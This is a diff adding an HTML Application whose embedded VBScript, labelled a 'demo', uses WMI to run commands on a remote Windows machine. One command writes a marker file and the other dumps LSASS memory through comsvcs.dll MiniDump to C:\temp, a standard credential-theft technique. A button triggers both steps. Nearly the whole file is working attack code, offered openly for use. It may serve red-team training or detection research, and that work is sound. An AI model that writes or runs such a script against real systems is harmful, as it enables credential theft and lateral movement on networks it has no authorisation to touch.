@@ -1,0 +1,51 @@
+<html>
+<head>
+<title>Lateral Movement & LSASS Dump Demo</title>
+<hta:application id="oHTA"
+    applicationname="Lateral Movement & LSASS Dump Demo"
+    border="thin"
+    borderstyle="normal"
+    caption="yes"
+    contextmenu="no"
+    innerborder="no"
+    maximizebutton="no"
+    minimizebutton="no"
+    navigable="no"
+    scroll="no"
+    selection="no"
+    showintaskbar="yes"
+    singleinstance="yes"
+    sysmenu="yes"
+></hta:application>
+<script language="VBScript">
+Sub LateralMovementAndDumpLSASS()
+    Dim objShell
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' Command to execute on remote machine for lateral movement
+    Dim lateralCommand
+    lateralCommand = "cmd.exe /c echo This is a lateral movement demo > C:\temp\lolbas_demo.txt"
+    
+    ' Command to dump LSASS memory on the remote machine
+    Dim lsassDumpCommand
+    lsassDumpCommand = ".\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full"
+    
+    ' Replace "remote_machine_ip" with the IP address of the target machine
+    Dim targetMachine
+    targetMachine = "remote_machine_ip"
+    
+    ' Execute lateral movement command on the remote machine
+    objShell.Run "cmd.exe /c wmic /node:" & targetMachine & " process call create """ & lateralCommand & """", 0, True
+    
+    ' Execute LSASS memory dump command on the remote machine
+    objShell.Run "cmd.exe /c wmic /node:" & targetMachine & " process call create """ & lsassDumpCommand & """", 0, True
+    
+    MsgBox "Lateral movement and LSASS dump executed successfully!"
+End Sub
+</script>
+<body>
+<h1>Lateral Movement & LSASS Dump Demo</h1>
+<p>Click the button below to demonstrate lateral movement and dump LSASS memory:</p>
+<input type="button" value="Execute Demo" onclick="LateralMovementAndDumpLSASS()">
+</body>
+</html>
